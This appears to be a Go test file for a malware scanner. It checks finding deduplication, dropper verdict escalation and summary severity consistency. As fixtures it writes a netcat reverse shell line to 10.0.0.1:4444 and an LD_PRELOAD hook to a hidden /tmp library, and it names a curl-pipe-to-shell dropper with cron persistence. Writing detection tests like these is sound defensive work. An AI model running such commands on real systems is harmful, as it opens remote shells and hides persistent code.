package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"aether/internal/config"
	"aether/internal/events"
	"aether/internal/report"
	"aether/internal/scanner"
	"aether/internal/yara"
)

type mockCorroborationYaraEngine struct {
	ruleMatches []yara.RuleMatch
}

func (m *mockCorroborationYaraEngine) LoadRules(rulePaths []string) error { return nil }
func (m *mockCorroborationYaraEngine) Enabled() bool                      { return true }
func (m *mockCorroborationYaraEngine) StatusString() string               { return "mock" }
func (m *mockCorroborationYaraEngine) Close() error                       { return nil }
func (m *mockCorroborationYaraEngine) NewScanner() yara.Scanner {
	return &mockCorroborationYaraScanner{engine: m}
}
func (m *mockCorroborationYaraEngine) Coverage() events.YARACoverageStats {
	return events.YARACoverageStats{RulesLoaded: 1}
}

type mockCorroborationYaraScanner struct {
	engine *mockCorroborationYaraEngine
}

func (s *mockCorroborationYaraScanner) Scan(target yara.ScanTarget) ([]yara.RuleMatch, error) {
	return s.engine.ruleMatches, nil
}
func (s *mockCorroborationYaraScanner) Destroy() {}

func TestScanner_IntraFileDeduplication(t *testing.T) {
	tmpDir := t.TempDir()
	filePath := filepath.Join(tmpDir, "revshell.sh")
	content := []byte("#!/bin/bash\nnc -e /bin/bash 10.0.0.1 4444\n")
	if err := os.WriteFile(filePath, content, 0755); err != nil {
		t.Fatal(err)
	}

	cfg := config.NewDefaultConfig()
	cfg.Scan.Root = tmpDir
	cfg.Scan.Paths = []string{filePath}
	cfg.Scan.ExplicitPaths = true
	cfg.Scan.Threads = 1

	bus := events.NewEventBus()
	defer bus.Close()
	sub := bus.Subscribe()
	defer sub.Close()

	mockYara := &mockCorroborationYaraEngine{
		ruleMatches: []yara.RuleMatch{
			{
				RuleName:   "Linux_Reverse_Shell_YARA",
				Severity:   report.SeverityAlert,
				Score:      90,
				Confidence: "high",
			},
		},
	}

	var findings []report.Finding
	done := make(chan struct{})
	go func() {
		defer close(done)
		for ev := range sub.Events() {
			if fe, ok := ev.(events.FindingRaised); ok {
				findings = append(findings, fe.Finding)
			}
			if _, ok := ev.(events.ScanFinished); ok {
				return
			}
		}
	}()

	s := scanner.NewScanner(cfg, bus, nil, nil,
		scanner.WithModules(nil),
		scanner.WithYARAEngine(mockYara),
	)
	if err := s.Run(context.Background()); err != nil {
		t.Fatalf("scanner Run failed: %v", err)
	}
	<-done

	// Must produce exactly 1 canonical finding for the file
	if len(findings) != 1 {
		t.Fatalf("expected 1 consolidated finding, got %d", len(findings))
	}

	f := findings[0]
	if f.Verdict != report.VerdictMalicious {
		t.Errorf("expected VerdictMalicious, got %s", f.Verdict)
	}
	if f.Severity != report.SeverityAlert {
		t.Errorf("expected SeverityAlert, got %s", f.Severity)
	}
	if f.EvidenceRecord == nil {
		t.Fatal("expected EvidenceRecord to be non-nil")
	}
	// ContributingDetectors should record the secondary rule match
	if len(f.EvidenceRecord.ContributingDetectors) == 0 {
		t.Errorf("expected non-empty ContributingDetectors, got none")
	} else if f.EvidenceRecord.ContributingDetectors[0] != "Linux_Reverse_Shell_YARA" {
		t.Errorf("expected contributing detector Linux_Reverse_Shell_YARA, got %s", f.EvidenceRecord.ContributingDetectors[0])
	}
}

func TestScanner_DropperEscalationWithCorroboration(t *testing.T) {
	// 1. Uncorroborated standalone dropper -> SUSPICIOUS / WARNING
	fUncorroborated := report.NewFinding("scanner", report.SeverityWarning, "/usr/local/bin/installer.sh", "curl | sh dropper detected", "Script_Download_And_Execute")
	v1 := report.DetermineVerdict(&fUncorroborated, nil, true, false, false, nil)
	if v1 != report.VerdictSuspicious {
		t.Errorf("expected uncorroborated dropper to be SUSPICIOUS, got %s", v1)
	}
	if fUncorroborated.Severity != report.SeverityWarning {
		t.Errorf("expected uncorroborated dropper to be WARNING, got %s", fUncorroborated.Severity)
	}

	// 2. Corroborated dropper in autostart / cron -> MALICIOUS / ALERT
	fCorroborated := report.NewFinding("scanner", report.SeverityWarning, "/tmp/drop.sh", "curl | sh dropper detected", "Script_Download_And_Execute")
	v2 := report.DetermineVerdict(&fCorroborated, nil, true, false, false, []string{"persistence:/etc/cron.hourly/drop"})
	if v2 != report.VerdictMalicious {
		t.Errorf("expected corroborated dropper to be MALICIOUS, got %s", v2)
	}
	if fCorroborated.Severity != report.SeverityAlert {
		t.Errorf("expected corroborated dropper to be ALERT, got %s", fCorroborated.Severity)
	}
	if fCorroborated.Confidence != report.ConfidenceHigh {
		t.Errorf("expected corroborated dropper confidence HIGH, got %s", fCorroborated.Confidence)
	}
}

// TestTopRules_MatchAdjudicatedSeverity guards summary-box consistency: when the
// verdict engine demotes a finding (e.g. contextual downgrade of a linker-hook
// script), the TopRules summary must reflect the adjudicated severity instead of
// the raw fire-time severity, so the summary never disagrees with the findings table.
func TestTopRules_MatchAdjudicatedSeverity(t *testing.T) {
	tmpDir := t.TempDir()
	filePath := filepath.Join(tmpDir, "linker_hook.sh")
	content := []byte("#!/bin/bash\nexport LD_PRELOAD=/tmp/.stealth/libhook.so\n")
	if err := os.WriteFile(filePath, content, 0755); err != nil {
		t.Fatal(err)
	}

	cfg := config.NewDefaultConfig()
	cfg.Scan.Root = tmpDir
	cfg.Scan.Paths = []string{filePath}
	cfg.Scan.ExplicitPaths = true
	cfg.Scan.Threads = 1

	bus := events.NewEventBus()
	defer bus.Close()
	sub := bus.Subscribe()
	defer sub.Close()

	var findings []report.Finding
	var scanFin *events.ScanFinished
	done := make(chan struct{})
	go func() {
		defer close(done)
		for ev := range sub.Events() {
			switch e := ev.(type) {
			case events.FindingRaised:
				findings = append(findings, e.Finding)
			case events.ScanFinished:
				sf := e
				scanFin = &sf
				return
			}
		}
	}()

	s := scanner.NewScanner(cfg, bus, nil, nil, scanner.WithModules(nil))
	if err := s.Run(context.Background()); err != nil {
		t.Fatalf("scanner Run failed: %v", err)
	}
	<-done

	if len(findings) == 0 {
		t.Fatalf("expected at least one finding for linker hook script")
	}
	f := findings[0]
	if f.RuleName != "Persistence_Linker_Audit_Hijack" {
		t.Fatalf("expected linker hook rule, got %s", f.RuleName)
	}
	if f.Severity != report.SeverityWarning {
		t.Fatalf("expected contextual demotion to WARNING, got %s", f.Severity)
	}

	if scanFin == nil {
		t.Fatalf("expected ScanFinished event")
	}
	for _, tr := range scanFin.TopRules {
		if tr.RuleName == "Persistence_Linker_Audit_Hijack" && tr.Severity != report.SeverityWarning {
			t.Errorf("TopRules severity (%s) disagrees with adjudicated finding severity (%s)", tr.Severity, f.Severity)
		}
	}
}
